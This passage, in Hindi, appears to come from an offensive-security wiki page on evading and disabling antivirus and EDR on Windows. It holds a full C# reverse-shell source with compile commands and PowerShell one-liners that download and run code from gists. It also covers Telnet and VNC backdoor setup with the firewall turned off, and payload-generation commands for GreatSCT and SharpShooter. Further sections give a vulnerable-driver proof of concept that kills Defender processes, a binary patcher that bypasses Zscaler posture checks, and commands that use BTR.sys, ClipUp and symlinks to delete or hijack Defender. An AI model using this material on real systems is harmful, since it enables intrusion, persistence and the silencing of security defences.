4. दिए गए command को आवश्यक बदलावों के साथ execute करें: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (`--pin` parameter GUI का उपयोग किए बिना PIN सेट करता है)।
 

## उन्नत Evasion

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Evasion एक बहुत जटिल विषय है। कभी-कभी आपको एक ही system में telemetry के कई अलग-अलग sources पर ध्यान देना पड़ता है, इसलिए mature environments में पूरी तरह undetected रहना लगभग असंभव है।

आप जिस भी environment के विरुद्ध काम करेंगे, उसकी अपनी strengths और weaknesses होंगी।

मैं आपको अधिक Advanced Evasion techniques की शुरुआत करने के लिए [@ATTL4S](https://twitter.com/DaniLJ94) की यह talk देखने की सलाह देता हूँ।


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

यह [@mariuszbit](https://twitter.com/mariuszbit) की Evasion in Depth के बारे में एक और शानदार talk है।


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **पुरानी Techniques**

### **जाँचें कि Defender किन हिस्सों को malicious मानता है**

आप [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) का उपयोग कर सकते हैं, जो binary के हिस्सों को **तब तक हटाता है** जब तक उसे **यह पता न चल जाए कि Defender किस हिस्से को malicious मान रहा है**, फिर उस हिस्से को आपके लिए अलग कर देता है।\
**यही काम करने वाला** एक और tool [**avred**](https://github.com/dobin/avred) है, जो [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) पर open web के ज़रिए यह service देता है।

### **Telnet Server**

Windows10 तक, सभी Windows versions में एक **Telnet server** आता था, जिसे आप (administrator के रूप में) इस तरह install कर सकते थे:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

इसे सिस्टम शुरू होते ही **शुरू** होने के लिए सेट करें और अभी इसे **चलाएँ**:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**telnet port बदलें** (stealth) और firewall disable करें:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

इसे यहाँ से डाउनलोड करें: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (आपको bin downloads चाहिए, setup नहीं)

**HOST पर**: _**winvnc.exe**_ चलाएँ और server configure करें:

- _Disable TrayIcon_ विकल्प सक्षम करें
- _VNC Password_ में password सेट करें
- _View-Only Password_ में password सेट करें

फिर, binary _**winvnc.exe**_ और **नई बनाई गई** file _**UltraVNC.ini**_ को **victim** में ले जाएँ

#### **Reverse connection**

**attacker** को अपने **host** में binary `vncviewer.exe -listen 5900` **चलानी** चाहिए, ताकि वह reverse **VNC connection** पाने के लिए **तैयार** रहे। फिर, **victim** में: winvnc daemon शुरू करें `winvnc.exe -run` और `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` चलाएँ

**चेतावनी:** stealth बनाए रखने के लिए आपको कुछ काम नहीं करने चाहिए

- अगर `winvnc` पहले से चल रहा है, तो उसे शुरू न करें, वरना [popup](https://i.imgur.com/1SROTTl.png) दिखाई देगा। `tasklist | findstr winvnc` से जाँचें कि क्या यह चल रहा है
- `winvnc` को उसी directory में `UltraVNC.ini` के बिना शुरू न करें, वरना [config window](https://i.imgur.com/rfMQWcf.png) खुल जाएगी
- मदद के लिए `winvnc -h` न चलाएँ, वरना [popup](https://i.imgur.com/oc18wcu.png) दिखाई देगा

### GreatSCT

इसे यहाँ से डाउनलोड करें: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

GreatSCT के अंदर:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

अब `msfconsole -r file.rc` के साथ **lister शुरू करें** और यह **xml payload** **execute** करें:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**मौजूदा Defender प्रोसेस को बहुत जल्दी terminate कर देगा।**

### अपना reverse shell compile करना

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### पहला C# Revershell

इसे इस कमांड से compile करें:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

इसके साथ इसका उपयोग करें:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# कंपाइलर का उपयोग

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

स्वचालित डाउनलोड और निष्पादन:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators की सूची: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Injector बनाने के लिए Python का उपयोग करने का उदाहरण:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### अन्य टूल्स

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### और

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## अपना Vulnerable Driver लाएँ (BYOVD) – Kernel Space से AV/EDR को खत्म करना

Storm-2603 ने ransomware छोड़ने से पहले endpoint protections को disable करने के लिए **Antivirus Terminator** नाम की एक छोटी console utility का इस्तेमाल किया। यह tool अपना **vulnerable लेकिन *signed* driver** साथ लाता है और उसका दुरुपयोग करके privileged kernel operations करता है, जिन्हें Protected-Process-Light (PPL) AV services भी block नहीं कर सकतीं।<sup>[[12]](#references)</sup>

मुख्य बातें
1. **Signed driver**: डिस्क पर भेजी गई file `ServiceMouse.sys` है, लेकिन binary Antiy Labs के “System In-Depth Analysis Toolkit” का वैध रूप से signed driver `AToolsKrnl64.sys` है। चूँकि इस driver पर Microsoft का valid signature है, इसलिए Driver-Signature-Enforcement (DSE) enabled होने पर भी यह load हो जाता है।
2. **Service installation**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   पहली line driver को **kernel service** के रूप में register करती है और दूसरी उसे start करती है, ताकि `\\.\ServiceMouse` user land से accessible हो जाए।
3. **driver द्वारा उपलब्ध कराए गए IOCTLs**
   | IOCTL code | Capability                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | PID के ज़रिए किसी भी process को terminate करना (Defender/EDR services को kill करने के लिए इस्तेमाल किया जाता है) |
   | `0x990000D0` | disk पर किसी भी file को delete करना |
   | `0x990001D0` | driver को unload करना और service को remove करना |

   Minimal C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **यह क्यों काम करता है**: BYOVD user-mode protections को पूरी तरह छोड़ देता है; kernel में execute होने वाला code *protected* processes को खोल सकता है, उन्हें terminate कर सकता है या kernel objects के साथ छेड़छाड़ कर सकता है—PPL/PP, ELAM या अन्य hardening features की परवाह किए बिना।

Detection / Mitigation
•  Microsoft की vulnerable-driver block list (`HVCI`, `Smart App Control`) enable करें, ताकि Windows `AToolsKrnl64.sys` को load करने से इनकार करे।
•  नई *kernel* services के creation को monitor करें और alert दें, जब कोई driver world-writable directory से load हो या allow-list में मौजूद न हो।
•  custom device objects के लिए user-mode handles और उसके बाद होने वाली suspicious `DeviceIoControl` calls पर नज़र रखें।

### On-Disk Binary Patching के ज़रिए Zscaler Client Connector Posture Checks को Bypass करना

Zscaler का **Client Connector** device-posture rules को locally लागू करता है और परिणामों को अन्य components तक पहुँचाने के लिए Windows RPC पर निर्भर करता है। Design के दो कमजोर विकल्पों की वजह से पूरी तरह bypass करना संभव है:

1. Posture evaluation **पूरी तरह client-side** होती है (server को एक boolean भेजा जाता है)।
2. Internal RPC endpoints केवल यह validate करते हैं कि connecting executable **Zscaler द्वारा signed** है (`WinVerifyTrust` के ज़रिए)।<sup>[[11]](#references)</sup>

**Disk पर चार signed binaries को patch करके**, इन दोनों mechanisms को निष्क्रिय किया जा सकता है:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | हमेशा `1` return करता है, इसलिए हर check compliant होता है |
| `ZSAService.exe` | `WinVerifyTrust` को indirect call | NOP-ed ⇒ कोई भी process (भले ही unsigned हो) RPC pipes से bind कर सकती है |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | इसकी जगह `mov eax,1 ; ret` रखा गया |
| `ZSATunnel.exe` | Tunnel पर integrity checks | Short-circuited |

Minimal patcher excerpt:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

After मूल फ़ाइलों को बदलने और service stack को रीस्टार्ट करने के बाद:

* **सभी** posture checks **green/compliant** दिखाते हैं।
* Unsigned या modified binaries नामित-pipe RPC endpoints (जैसे, `\\RPC Control\\ZSATrayManager_talk_to_me`) खोल सकते हैं।
* Compromised host को Zscaler policies द्वारा परिभाषित internal network तक unrestricted access मिल जाता है।

यह case study दिखाता है कि केवल client-side trust decisions और simple signature checks को कुछ byte patches से कैसे हराया जा सकता है।

## Microsoft Defender `BTR.sys` की trusted-functionality का दुरुपयोग

Defender का **Boot-Time Removal** driver, classic BYOVD का एक उपयोगी counterexample है। `BTR.sys` एक वैध Microsoft-signed remediation component है, जिसमें memory-corruption bug नहीं है और न ही IOCTL interface; इसके बजाय, administrator access और `SeLoadDriverPrivilege` हासिल करने के बाद, operator इसका private remediation transaction forge करके इच्छित Ring-0 file/registry operations कर सकता है। यह **post-compromise AV/EDR-neutralization primitive है, initial access या privilege escalation नहीं**, और conspicuous third-party driver import करने के बजाय driver को target के अपने `MpEngine.dll` के `BOOTTIMETOOL` resource से extract किया जा सकता है।<sup>[[36]](#references)</sup>

### One-shot driver को stage करना

Defender आम तौर पर इस resource को random `[a-z]{8}.sys` फ़ाइल के रूप में drop करता है और इसी तरह नाम वाली kernel service register करता है। `DriverEntry` service की `Args` value पढ़ता है, referenced NTFS ADS खोलता है, action list को decrypt और validate करता है, feedback लिखता है, और सफल execution के बाद `0xC0000056` (`STATUS_DELETE_PENDING`) लौटाता है, ताकि driver resident रहने के बजाय unload हो जाए। Forged service में निम्नलिखित विशिष्ट values होती हैं।<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

`:changelist` stream में एक RC4-encrypted blob होता है। विश्लेषित builds एक निश्चित 256-byte key का पुनः उपयोग करते हैं, इसलिए encryption authorization boundary नहीं है। एक मान्य plaintext में 24-byte global header (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, header CRC और payload से निकला transaction ID) होता है, जिसके बाद null-terminated UTF-16 feedback path और कितने भी items होते हैं। हर item में 16-byte header (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) और action-specific data होता है, जिसके अंत में **ठीक चार NUL bytes** होते हैं। हर header/data region को CRC-32 polynomial `0xEDB88320`, initial state `0xFFFFFFFF`, और **बिना final XOR** (`~CRC32`) से अलग-अलग जाँचा जाता है; हर region के लिए CRC state रीसेट होता है।<sup>[[36]](#references)[[37]](#references)</sup>

स्वीकार किए गए action IDs इन kernel primitives को उजागर करते हैं।<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Item data | परिणाम |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | किसी फ़ाइल को हटाना, locked file सहित |
| 2 | `[UTF-16 path]` | खाली directory हटाना |
| 3 | `[Flags][source][destination]` | फ़ाइल को attacker द्वारा चुने गए protected path पर ले जाना; खाली destination का अर्थ है हटाना |
| 4 | `[Flags][key path]` | Registry key को recursively हटाना |
| 5 | `[Flags][key path + "\\" + value]` | Registry value हटाना |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Registry value बनाना/अपडेट करना और अनुपस्थित key paths बनाना |

Actions 5 और 6 के लिए, wire पर key/value separator में **लगातार दो backslashes** होते हैं; सामान्य तरीके से format किया गया path सही तरह से split नहीं होगा। Feedback file अधिकतर request को ही दर्शाती है, लेकिन हर item के पहले चार data bytes उसके resulting `NTSTATUS` बन जाते हैं। Actions 1 और 2 में, जिनमें leading flags field नहीं होता, BTR path को चार reserved trailing bytes में खिसका देता है ताकि उस status के लिए जगह बन सके।<sup>[[36]](#references)</sup>

### `BTR_CLI` workflow और शुरुआती boot window

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) पूरी chain लागू करता है: local Defender से `BTR.sys` निकालना, `<random>.sys:changelist` और एक feedback stream बनाना, chained actions को serialize/checksum/encrypt करना, सीधे service registry key बनाना, फिर `-trigger now` के लिए `NtLoadDriver` call करना या `-trigger boot` के लिए इसे system-start driver के रूप में छोड़ देना। सीधे registry staging करने से सामान्य SCM `CreateServiceW` path बच जाता है और इसलिए service-install Event ID 7045 उत्पन्न **नहीं** होता। Boot-triggered artifacts को बाद में `BTR_CLI.exe -cleanup <service_name>` से हटाया जा सकता है।<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` उपयोगी नहीं है, क्योंकि storage stack और `SystemRoot` link तैयार होने से पहले BTR, `DriverEntry` से file I/O करता है। `Start=1` और high-priority `Boot Bus Extender` group के साथ यह Phase 1 में execute होता है: NTFS उपयोग के लिए तैयार होता है, लेकिन कई system-start security drivers और user-mode EDR services initialize नहीं हुए होते। `WdFilter` जैसे boot-start filters पहले से load हो सकते हैं, फिर भी BTR अगले start से पहले उनकी binaries या service configuration हटा सकता है और SCM द्वारा launch किए जाने से पहले service executables delete कर सकता है। ELAM इस gap को बंद नहीं करता, क्योंकि BTR boot-start evaluation के बाद चलता है और उसके पास valid Microsoft signature होता है।<sup>[[36]](#references)</sup>

एक transaction में कई actions execute होते हैं। PoC, hard-coded `\SystemRoot\Temp\BootClean.log` के लिए Action 1 को सबसे आगे जोड़ता है: BTR यह log बनाता है, फिर अपने delete request को पूरा करके unload होने से पहले इसे हटा देता है। इससे evidence कम होता है; वहीं feedback को `<random>.sys:<random>.dat` में रखने से driver और दोनों streams को एक साथ हटाया जा सकता है।<sup>[[36]](#references)[[37]](#references)</sup>

### High-signal detection correlations

केवल signature पर आधारित rules और Microsoft vulnerable-driver blocklist, BTR की intended functionality के दुरुपयोग को संबोधित नहीं करते। इन behavioral correlations को प्राथमिकता दें और साथ ही legitimate Defender lineage को किसी arbitrary launcher से अलग पहचानें।<sup>[[36]](#references)</sup>

- **Sysmon 15:** `.sys:changelist` का बनना BTR staging में हमेशा होता है। उसी `.sys` से जुड़ा `.dat` ADS खास तौर पर संदिग्ध है, क्योंकि legitimate Defender आम तौर पर feedback को `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` के अंतर्गत रखता है।
- **System 7045 के बिना Sysmon 12/13:** `HKLM\SYSTEM\CurrentControlSet\Services\<random>` के direct creation को correlate करें, जिसमें `Args=...:changelist` और `Group=Boot Bus Extender` हों, लेकिन कोई matching SCM installation event न हो।
- **Sysmon 6 -> 23:** किसी non-Defender lineage से ज्ञात BTR driver load को उसके बाद `System`/PID 4 द्वारा की गई file deletion से correlate करें—खासकर security binaries के मामले में।
- **Sysmon 11 -> 23:** `System`/PID 4 द्वारा `\SystemRoot\Temp\BootClean.log` को तेज़ी से बनाने और हटाने पर alert करें।
- `SeLoadDriverPrivilege` के assignment/enabling को सीमित करें और audit करें; जब `cmd.exe`, PowerShell या किसी unknown process द्वारा security-tool driver stage किया गया हो, तो केवल Microsoft signature पर्याप्त भरोसे की वजह नहीं है।

## LOLBINs के साथ AV/EDR से छेड़छाड़ करने के लिए Protected Process Light (PPL) का दुरुपयोग

Protected Process Light (PPL) signer/level hierarchy लागू करता है, ताकि केवल समान या उच्चतर protected processes ही एक-दूसरे से छेड़छाड़ कर सकें। Offensive दृष्टिकोण से, अगर आप वैध रूप से PPL-enabled binary launch कर सकते हैं और उसके arguments नियंत्रित कर सकते हैं, तो benign functionality (जैसे logging) को AV/EDR द्वारा उपयोग की जाने वाली protected directories के विरुद्ध constrained, PPL-backed write primitive में बदल सकते हैं।<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

किसी process को PPL के रूप में चलाने के लिए
- Target EXE (और कोई भी loaded DLL) को PPL-capable EKU के साथ signed होना चाहिए।
- Process को इन flags के साथ CreateProcess का उपयोग करके बनाया जाना चाहिए: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`।
- ऐसा compatible protection level request किया जाना चाहिए जो binary के signer से मेल खाता हो (जैसे anti-malware signers के लिए `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows signers के लिए `PROTECTION_LEVEL_WINDOWS`)। गलत levels पर creation विफल हो जाएगा।

PP/PPL और LSASS protection के व्यापक परिचय के लिए यह भी देखें:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (protection level चुनता है और target EXE को arguments forward करता है):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- उपयोग का पैटर्न:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- हस्ताक्षरित सिस्टम बाइनरी `C:\Windows\System32\ClipUp.exe` स्वयं को लॉन्च करती है और कॉलर द्वारा निर्दिष्ट पथ पर लॉग फ़ाइल लिखने के लिए एक पैरामीटर स्वीकार करती है।
- PPL process के रूप में लॉन्च किए जाने पर, फ़ाइल लेखन PPL backing के साथ होता है।
- ClipUp उन पथों को parse नहीं कर सकता जिनमें spaces हों; सामान्यतः सुरक्षित स्थानों तक पहुँचने के लिए 8.3 short paths का उपयोग करें।

8.3 short path helpers
- Short names की सूची बनाएँ: प्रत्येक parent directory में `dir /x` चलाएँ।
- cmd में short path निकालें: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) एक launcher (जैसे, CreateProcessAsPPL) का उपयोग करके `CREATE_PROTECTED_PROCESS` के साथ PPL-capable LOLBIN (ClipUp) लॉन्च करें।
2) किसी सुरक्षित AV directory (जैसे, Defender Platform) में फ़ाइल बनवाने के लिए ClipUp का log-path argument दें। ज़रूरत पड़ने पर 8.3 short names का उपयोग करें।
3) यदि AV के चलते समय target binary सामान्यतः खुली/locked रहती है (जैसे, MsMpEng.exe), तो AV शुरू होने से पहले boot पर write शेड्यूल करें; इसके लिए ऐसी auto-start service इंस्टॉल करें जो भरोसेमंद रूप से पहले चलती हो। Process Monitor (boot logging) से boot ordering की पुष्टि करें।
4) Reboot पर, PPL-backed write AV द्वारा अपनी binaries को lock करने से पहले होती है, जिससे target file corrupt हो जाती है और AV शुरू नहीं हो पाता।

Example invocation (safety के लिए paths redacted/shortened):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

नोट्स और सीमाएँ
- आप ClipUp द्वारा लिखे जाने वाले कंटेंट को नियंत्रित नहीं कर सकते; केवल उसकी जगह नियंत्रित कर सकते हैं। यह primitive सटीक कंटेंट injection के बजाय corruption के लिए उपयुक्त है।
- सेवा install/start करने और reboot window के लिए local admin/SYSTEM की आवश्यकता है।
- Timing महत्वपूर्ण है: target खुला नहीं होना चाहिए; boot-time execution से file locks से बचा जा सकता है।

पहचान
- Boot के आसपास असामान्य arguments के साथ `ClipUp.exe` का process creation, खासकर जब उसका parent कोई non-standard launcher हो।
- Auto-start के लिए कॉन्फ़िगर की गई नई services, जो संदिग्ध binaries चलाती हों और लगातार Defender/AV से पहले शुरू होती हों। Defender startup failures से पहले service creation/modification की जाँच करें।
- Defender binaries/Platform directories की file integrity monitoring; protected-process flags वाले processes द्वारा अनपेक्षित file creations/modifications।
- ETW/EDR telemetry: `CREATE_PROTECTED_PROCESS` के साथ बनाए गए processes और non-AV binaries द्वारा असामान्य PPL level उपयोग पर ध्यान दें।

Mitigations
- WDAC/Code Integrity: सीमित करें कि कौन-सी signed binaries PPL के रूप में चल सकती हैं और किन parents के अंतर्गत; वैध contexts के बाहर ClipUp invocation को block करें।
- Service hygiene: auto-start services के creation/modification को सीमित करें और start-order manipulation की निगरानी करें।
- सुनिश्चित करें कि Defender tamper protection और early-launch protections सक्षम हों; binary corruption के संकेत देने वाली startup errors की जाँच करें।
- यदि आपके environment के अनुकूल हो, तो security tooling रखने वाले volumes पर 8.3 short-name generation बंद करने पर विचार करें (अच्छी तरह test करें)।

## Platform Version Folder Symlink Hijack के ज़रिए Microsoft Defender के साथ छेड़छाड़

Windows Defender यह तय करता है कि उसे किस platform से चलना है, इसके लिए वह इन सबफ़ोल्डरों को enumerate करता है:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

यह सबसे ऊँची lexicographic version string वाला सबफ़ोल्डर चुनता है (जैसे, `4.18.25070.5-0`), फिर वहाँ से Defender service processes शुरू करता है (और service/registry paths को उसी अनुसार update करता है)। यह चयन directory reparse points (symlinks) समेत directory entries पर भरोसा करता है। एक administrator इसका लाभ उठाकर Defender को attacker-writable path पर redirect कर सकता है और DLL sideloading या service disruption कर सकता है।<sup>[[21]](#references)[[22]](#references)</sup>

पूर्वापेक्षाएँ
- Local Administrator (Platform folder के अंतर्गत directories/symlinks बनाने के लिए आवश्यक)
- Reboot करने या Defender platform re-selection trigger करने की क्षमता (boot पर service restart)
- केवल built-in tools आवश्यक हैं (`mklink`)

यह क्यों काम करता है
- Defender अपने folders में writes को block करता है, लेकिन उसका platform selection directory entries पर भरोसा करता है और यह सत्यापित किए बिना lexicographically सबसे ऊँचा version चुनता है कि target किसी protected/trusted path पर resolve होता है या नहीं।

चरण-दर-चरण (उदाहरण)
1) मौजूदा platform folder की एक writable clone तैयार करें, जैसे `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform के अंदर अपने folder की ओर इंगित करने वाला higher-version directory symlink बनाएँ:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger चयन (reboot की सलाह दी जाती है):
```cmd
shutdown /r /t 0
```
4) पुष्टि करें कि MsMpEng.exe (WinDefend) रीडायरेक्ट किए गए path से चलता है:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
आपको `C:\TMP\AV\` के अंतर्गत नया process path और उस location को दर्शाने वाली service configuration/registry दिखनी चाहिए।

Post-exploitation options
